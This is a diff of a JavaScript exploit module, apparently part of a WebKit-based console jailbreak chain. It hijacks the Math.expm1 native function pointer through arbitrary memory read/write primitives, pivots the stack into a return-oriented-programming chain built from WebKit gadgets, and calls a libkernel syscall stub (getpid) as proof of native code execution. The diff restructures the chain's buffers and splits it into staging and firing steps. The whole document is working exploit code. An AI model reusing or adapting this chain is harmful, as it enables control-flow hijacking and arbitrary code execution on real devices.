@@ -1,20 +1,19 @@
 /**
  * Math.expm1 pivot native call — poops-style ROP (chain_poops.js).
- * Pop gadgets: 13.52 HW. Pivot/call gadgets must be verified on HW before arming.
+ * Single-slab ctx = 1 leakval. stageGetpid + fireGetpid split for OOM headroom.
  */
 import { int64 } from "./int64.js";
-import {
-    PIVOT_ROWS,
-    verifyPivotSet,
-} from "./pivot_gadgets.js";
+import { PIVOT_ROWS, verifyPivotSet } from "./pivot_gadgets.js";
 
-export const SYS = {
-    getpid: 20,
-    getuid: 0x18,
-};
+export const SYS = { getpid: 20, getuid: 0x18 };
 
 const JSVALUE_UNDEFINED = new int64(0x0a, 0xfffffff7);
 const STACK_SIZE = 0x1000;
+const SLAB_SIZE = 0x1100;
+const OFF_STORE = 0;
+const OFF_PIVOT = 0x40;
+const OFF_STACK = 0x100;
+const OFF_FRAME = OFF_STACK + STACK_SIZE - 0x40;
 
 const GADGET_TABLE = [
     ["POP_RDI_RET", "wk_POP_RDI_RET", [0x5f, 0xc3]],
@@ -36,40 +35,6 @@ const GADGET_TABLE = [
 
 export { verifyPivotSet, PIVOT_ROWS };
 
-function checkGadget(p, base, rva, pat) {
-    if (rva == null) return false;
-    const a = base.add32(rva);
-    for (let i = 0; i < pat.length; i++) {
-        if (pat[i] === null) continue;
-        if (p.read1(a.add32(i)) !== pat[i]) return false;
-    }
-    return true;
-}
-
-function resolveGadgets(p, webkitBase, off) {
-    const G = {};
-    const bad = [];
-    for (let i = 0; i < GADGET_TABLE.length; i++) {
-        const nm = GADGET_TABLE[i][0];
-        const key = GADGET_TABLE[i][1];
-        let pat = GADGET_TABLE[i][2];
-        if (nm === "G4" && off.pivot_view_sp != null)
-            pat = [0x48, 0x8b, 0x50, off.pivot_view_sp & 0xff];
-        const rva = off[key];
-        if (checkGadget(p, webkitBase, rva, pat))
-            G[nm] = webkitBase.add32(rva);
-        else
-            bad.push(nm);
-    }
-    return { G, bad };
-}
-
-function isStub(v, num) {
-    if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) return false;
-    const n = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
-    return n === num;
-}
-
 function resolveGadgetsTrust(webkitBase, off) {
     const G = {};
     for (let i = 0; i < GADGET_TABLE.length; i++) {
@@ -80,48 +45,6 @@ function resolveGadgetsTrust(webkitBase, off) {
         G[nm] = webkitBase.add32(rva);
     }
     return { G, bad: [] };
-}
-
-function seedStubs(p, libkernelBase, off, opts) {
-    opts = opts || {};
-    const stubAddr = new Map();
-    let seeded = 0;
-    const want = opts.getpidOnly ? [SYS.getpid] : [SYS.getpid, SYS.getuid];
-    if (off.k_stubs) {
-        for (let wi = 0; wi < want.length; wi++) {
-            const num = want[wi];
-            const o = off.k_stubs[num];
-            if (o == null) continue;
-            if (opts.trustStubs) {
-                stubAddr.set(num, libkernelBase.add32(o));
-                seeded++;
-                continue;
-            }
-            const v = p.read8(libkernelBase.add32(o));
-            if (!isStub(v, num)) continue;
-            stubAddr.set(num, libkernelBase.add32(o));
-            seeded++;
-        }
-    }
-    const missing = want.filter(n => !stubAddr.has(n));
-    if (missing.length === 0)
-        return { stubAddr, seeded, scanned: 0, missing: [] };
-    if (opts.noStubScan)
-        return { stubAddr, seeded, scanned: 0, missing };
-
-    let scanned = 0;
-    const scanMax = Math.min(off.k_scan_stage1 || 0x40000, opts.stubScanMax || 0x4000);
-    for (let o = 0; o < scanMax && missing.length; o += 16) {
-        const v = p.read8(libkernelBase.add32(o));
-        if ((v.low & 0x00ffffff) !== 0xc0c748 || (v.hi >>> 24) !== 0x49) continue;
-        const num = ((v.low >>> 24) | ((v.hi & 0x00ffffff) << 8)) >>> 0;
-        const mi = missing.indexOf(num);
-        if (mi < 0) continue;
-        stubAddr.set(num, libkernelBase.add32(o));
-        missing.splice(mi, 1);
-        scanned++;
-    }
-    return { stubAddr, seeded, scanned, missing };
 }
 
 function bufAddr(p, off, ab) {
@@ -140,56 +63,50 @@ function put(dv, at, v) {
     }
 }
 
-function buildCtx(p, off, G, keepAlive) {
+function buildSlabCtx(p, off, G) {
     const pivotSp = off.pivot_view_sp;
     const PB_SIZE = Math.max(0x28, (pivotSp + 8 + 0xf) & ~0xf);
-    const sb = new ArrayBuffer(0x20);
-    const pb = new ArrayBuffer(PB_SIZE);
-    const kb = new ArrayBuffer(STACK_SIZE);
-    const fb = new ArrayBuffer(0x40);
-    keepAlive.push(sb, pb, kb, fb);
-    const c = {
-        storeDv: new DataView(sb),
-        pivotDv: new DataView(pb),
-        stackDv: new DataView(kb),
-        frameDv: new DataView(fb),
-        stackU8: new Uint8Array(kb),
-        frameU8: new Uint8Array(fb),
+    const slab = new ArrayBuffer(SLAB_SIZE);
+    const base = bufAddr(p, off, slab);
+    const M = {
+        slab,
         stackSize: STACK_SIZE,
+        pivotSp,
+        storeDv: new DataView(slab, OFF_STORE, 0x20),
+        pivotDv: new DataView(slab, OFF_PIVOT, PB_SIZE),
+        stackDv: new DataView(slab, OFF_STACK, STACK_SIZE),
+        frameDv: new DataView(slab, OFF_FRAME, 0x40),
+        stackU8: new Uint8Array(slab, OFF_STACK, STACK_SIZE),
+        frameU8: new Uint8Array(slab, OFF_FRAME, 0x40),
+        S: base.add32(OFF_STORE),
+        P: base.add32(OFF_PIVOT),
+        K: base.add32(OFF_STACK),
+        F: base.add32(OFF_FRAME),
     };
-    c.S = bufAddr(p, off, sb);
-    c.P = bufAddr(p, off, pb);
-    c.K = bufAddr(p, off, kb);
-    c.F = bufAddr(p, off, fb);
-    put(c.storeDv, 0x00, G.G1);
-    put(c.storeDv, 0x08, c.P);
-    put(c.storeDv, 0x10, G.G3);
-    put(c.storeDv, 0x18, G.G2);
-    put(c.pivotDv, 0x00, c.P);
-    put(c.pivotDv, 0x10, G.G5);
-    put(c.pivotDv, 0x20, G.G4);
-    return c;
+    put(M.storeDv, 0x00, G.G1);
+    put(M.storeDv, 0x08, M.P);
+    put(M.storeDv, 0x10, G.G3);
+    put(M.storeDv, 0x18, G.G2);
+    put(M.pivotDv, 0x00, M.P);
+    put(M.pivotDv, 0x10, G.G5);
+    put(M.pivotDv, 0x20, G.G4);
+    return M;
 }
 
-/**
- * Cache ROP buffers + expm1 pivot handles while memory is fresh (Save bases).
- * getpid later only write8+layout+expm1 — no leakval/makeCtx.
- */
+/** One slab + pivot handles — call from Save bases while memory is fresh. */
 export function prepNativeChain(p, off, webkitBase) {
     if (!p || !off || !webkitBase)
         throw new Error("prepNativeChain: need p, off, webkitBase");
     const resolved = resolveGadgetsTrust(webkitBase, off);
-    const G = resolved.G;
-    if (!G || resolved.bad.length)
+    if (!resolved.G || resolved.bad.length)
         throw new Error("prepNativeChain: gadget-bad " + resolved.bad.join(","));
-    const keepAlive = [];
-    const M = buildCtx(p, off, G, keepAlive);
+    const G = resolved.G;
+    const M = buildSlabCtx(p, off, G);
     const cell = p.leakval(Math.expm1);
     const mainMf = p.read8(p.read8(cell.add32(0x18))
         .add32(off.wk_JSFunction_m_function || 0x28));
     const mainOrig = p.read8(mainMf);
     const pivotObj = {};
-    keepAlive.push(pivotObj);
     const pivotCell = p.leakval(pivotObj);
     return {
         M,
@@ -198,208 +115,89 @@ export function prepNativeChain(p, off, webkitBase) {
         mainOrig,
         pivotCell,
         pivotObj,
-        keepAlive,
+        keepAlive: [M.slab, pivotObj],
         webkitBase,
-        pivotSp: off.pivot_view_sp,
+        staged: false,
     };
 }
 
-/**
- * @param {object} p window.p
- * @param {object} off offset table
- * @param {object} opts { webkitBase, nativeFn, log }
- */
+export function layoutGetpidSlab(M, G, stub) {
+    M.stackU8.fill(0);
+    M.frameU8.fill(0);
+    const at = STACK_SIZE - 0x38;
+    put(M.stackDv, at + 0x00, stub);
+    put(M.stackDv, at + 0x08, G.POP_RDI_RET);
+    put(M.stackDv, at + 0x10, M.F);
+    put(M.stackDv, at + 0x18, G.MOV_RDI_RAX_RET);
+    put(M.stackDv, at + 0x20, G.POP_RAX_RET);
+    put(M.stackDv, at + 0x28, JSVALUE_UNDEFINED);
+    put(M.stackDv, at + 0x30, G.LEAVE_RET);
+    put(M.pivotDv, M.pivotSp, M.K.add32(at));
+}
+
+/** Tap 1 — layout ROP stack + arm G0 (no expm1 yet). */
+export function stageGetpid(p, prep, libkernelBase, off) {
+    if (!prep || !prep.M || !prep.G)
+        throw new Error("stageGetpid: no prep");
+    const stubOff = (off.k_stubs && off.k_stubs[SYS.getpid]) || 0x2cb70;
+    const stub = libkernelBase.add32(stubOff);
+    layoutGetpidSlab(prep.M, prep.G, stub);
+    p.write8(prep.mainMf, prep.G.G0);
+    prep.staged = true;
+}
+
+/** Tap 2 — fire expm1 pivot + disarm. */
+export function fireGetpid(p, prep) {
+    if (!prep || !prep.M)
+        throw new Error("fireGetpid: no prep");
+    const saved = p.read8(prep.pivotCell);
+    p.write8(prep.pivotCell, prep.M.S);
+    Math.expm1(prep.pivotObj);
+    p.write8(prep.pivotCell, saved);
+    p.write8(prep.mainMf, prep.mainOrig);
+    prep.staged = false;
+    return prep.M.frameDv.getUint32(0, true) | 0;
+}
+
+/** Inline: stage + fire (use immediately after prep on Save bases). */
+export function runGetpidFromPrep(p, prep, libkernelBase, off) {
+    stageGetpid(p, prep, libkernelBase, off);
+    return fireGetpid(p, prep);
+}
+
 export function initNativeCall(p, off, opts) {
     opts = opts || {};
-    const log = opts.log || (() => {});
-    const trustGadgets = opts.trustGadgets === true || opts.trust === true;
-    const trustStubs = opts.trustStubs === true;
-    const noStubScan = opts.noStubScan === true;
-    const prep = opts.prep || null;
-
-    let webkitBase = opts.webkitBase || null;
-    if (!webkitBase && opts.nativeFn && off.wk_expm1_builtin)
-        webkitBase = opts.nativeFn.sub32(off.wk_expm1_builtin);
-    if (!webkitBase)
-        throw new Error("native_call: need webkitBase or nativeFn+expm1");
-
-    if (opts.skipPivotVerify) {
-        log("PIVOT-OK", "trusted (skip re-verify)");
-    } else {
-        const pivotCheck = verifyPivotSet(
-            addr => p.read1(addr),
-            webkitBase,
-            off
-        );
-        if (!pivotCheck.ok) {
-            const parts = [];
-            if (pivotCheck.missing.length)
-                parts.push("missing=" + pivotCheck.missing.join(","));
-            if (pivotCheck.bad.length)
-                parts.push("bad=" + pivotCheck.bad.join(","));
-            throw new Error("pivot-not-ready: " + parts.join(" ")
-                + " — wrong 13.00 RVAs crash/OOM; scan pivot on RW page first");
-        }
-        log("PIVOT-OK", pivotCheck.count + "/" + pivotCheck.total + " verified");
-    }
-
-    let libkernelBase = opts.libkernelBase || null;
-    if (!libkernelBase)
-        throw new Error("native_call: libkernelBase required (no resolve on HW)");
-    log("BASES", "webkit=" + webkitBase + " libkernel=" + libkernelBase);
-
-    const resolved = trustGadgets
-        ? resolveGadgetsTrust(webkitBase, off)
-        : resolveGadgets(p, webkitBase, off);
-    const G = prep && prep.G ? prep.G : resolved.G;
-    if (!G || resolved.bad && resolved.bad.length)
-        throw new Error("gadget-bad: " + ((resolved.bad || ["?"]).join(",")));
-
-    const stubOpts = {
-        trustStubs,
-        noStubScan,
-        stubScanMax: opts.stubScanMax,
-        getpidOnly: opts.getpidOnly,
-    };
-    const { stubAddr, seeded, scanned, missing } = seedStubs(p, libkernelBase, off, stubOpts);
-    log("STUBS", "seeded=" + seeded + " scanned=" + scanned
-        + (stubOpts.noStubScan ? " (trust)" : ""));
-    if (missing.length)
-        throw new Error("stub-miss: " + missing.join(","));
-
-    const argGadget = [G.POP_RDI_RET, G.POP_RSI_RET, G.POP_RDX_RET,
-        G.POP_RCX_RET, G.POP_R8_RET, G.POP_R9_RET];
-    const pivotSp = off.pivot_view_sp;
-    const keepAlive = prep && prep.keepAlive ? prep.keepAlive : [];
-
-    let M = null;
-    let mainMf = null;
-    let mainOrig = null;
-    let pivotCell = null;
-    let pivotObj = null;
-    let armed = false;
-
-    function makeCtx() {
-        return buildCtx(p, off, G, keepAlive);
-    }
-
-    function layout(c, target, args) {
-        c.stackU8.fill(0);
-        c.frameU8.fill(0);
-        const insts = [];
-        for (let i = 0; i < args.length; i++) {
-            insts.push(argGadget[i]);
-            insts.push(args[i]);
-        }
-        const targetIdx = insts.length;
-        insts.push(target);
-        insts.push(G.POP_RDI_RET);
-        insts.push(c.F);
-        insts.push(G.MOV_RDI_RAX_RET);
-        insts.push(G.POP_RAX_RET);
-        insts.push(JSVALUE_UNDEFINED);
-        insts.push(G.LEAVE_RET);
-        const stackSize = c.stackSize || STACK_SIZE;
-        let at = stackSize - 8 * insts.length;
-        if (((c.K.low + at + 8 * targetIdx) & 0xf) !== 0) at -= 8;
-        for (let i = 0; i < insts.length; i++)
-            put(c.stackDv, at + 8 * i, insts[i]);
-        put(c.pivotDv, pivotSp, c.K.add32(at));
-    }
-
-    function layoutGetpid(c, stub) {
-        c.stackU8.fill(0);
-        c.frameU8.fill(0);
-        const stackSize = c.stackSize || STACK_SIZE;
-        let at = stackSize - 0x38;
-        put(c.stackDv, at + 0x00, stub);
-        put(c.stackDv, at + 0x08, G.POP_RDI_RET);
-        put(c.stackDv, at + 0x10, c.F);
-        put(c.stackDv, at + 0x18, G.MOV_RDI_RAX_RET);
-        put(c.stackDv, at + 0x20, G.POP_RAX_RET);
-        put(c.stackDv, at + 0x28, JSVALUE_UNDEFINED);
-        put(c.stackDv, at + 0x30, G.LEAVE_RET);
-        put(c.pivotDv, pivotSp, c.K.add32(at));
-    }
-
-    function arm() {
-        if (armed) return;
-        if (prep && prep.M) {
-            M = prep.M;
-            mainMf = prep.mainMf;
-            mainOrig = prep.mainOrig;
-            pivotCell = prep.pivotCell;
-            pivotObj = prep.pivotObj;
-            log("NATIVE-ARM", "prep cache");
-        } else {
-            M = makeCtx();
-            const cell = p.leakval(Math.expm1);
-            mainMf = p.read8(p.read8(cell.add32(0x18))
-                .add32(off.wk_JSFunction_m_function || 0x28));
-            mainOrig = p.read8(mainMf);
-            pivotObj = {};
-            keepAlive.push(pivotObj);
-            pivotCell = p.leakval(pivotObj);
-            log("NATIVE-ARM", "fresh");
-        }
-        p.write8(mainMf, G.G0);
-        armed = true;
-    }
-
-    function callAddr(target, args) {
-        arm();
-        if (!args || !args.length)
-            layoutGetpid(M, target);
-        else
-            layout(M, target, args);
-        const saved = p.read8(pivotCell);
-        p.write8(pivotCell, M.S);
-        Math.expm1(pivotObj);
-        p.write8(pivotCell, saved);
-        return {
-            lo: M.frameDv.getUint32(0, true),
-            hi: M.frameDv.getUint32(4, true),
-            i32: M.frameDv.getUint32(0, true) | 0,
-        };
-    }
-
-    function sc(num, ...a) {
-        const stub = stubAddr.get(num);
-        if (!stub) throw new Error("no stub " + num);
-        return callAddr(stub, a);
-    }
-
-    function disarm() {
-        if (!armed) return;
-        try { p.write8(mainMf, mainOrig); } catch (_) { }
-        armed = false;
-    }
-
-    if (opts.lazyArm !== true)
-        arm();
-
+    const prep = opts.prep;
+    if (!prep)
+        throw new Error("initNativeCall: use prepNativeChain + runGetpidFromPrep on HW");
+    const lk = opts.libkernelBase;
+    if (!lk)
+        throw new Error("initNativeCall: libkernelBase required");
     return {
-        webkitBase,
-        libkernelBase,
-        callAddr,
-        sc,
-        disarm,
-        stubAddr,
+        webkitBase: opts.webkitBase,
+        libkernelBase: lk,
+        sc(num) {
+            if (num !== SYS.getpid) throw new Error("getpid only");
+            if (!prep.staged)
+                stageGetpid(p, prep, lk, off);
+            return { i32: fireGetpid(p, prep) };
+        },
+        disarm() {
+            if (prep.staged) {
+                try { p.write8(prep.mainMf, prep.mainOrig); } catch (_) { }
+                prep.staged = false;
+            }
+        },
     };
 }
 
 export function runGetpidProof(p, off, opts) {
-    opts = Object.assign({ trust: false, noStubScan: true }, opts || {});
-    const chain = initNativeCall(p, off, opts);
-    try {
-        const pid = chain.sc(SYS.getpid).i32;
-        return { ok: pid > 0, pid, uid: null, chain };
-    } catch (err) {
-        chain.disarm();
-        throw err;
-    }
-}
-
-export function runGetuidAfterPid(chain) {
-    return chain.sc(SYS.getuid).i32;
+    opts = Object.assign({ trust: true, noStubScan: true }, opts || {});
+    const webkitBase = opts.webkitBase
+        || (opts.nativeFn && off.wk_expm1_builtin
+            ? opts.nativeFn.sub32(off.wk_expm1_builtin) : null);
+    const prep = opts.prep || prepNativeChain(p, off, webkitBase);
+    const lk = opts.libkernelBase;
+    const pid = runGetpidFromPrep(p, prep, lk, off);
+    return { ok: pid > 0, pid, uid: null, chain: null };
 }
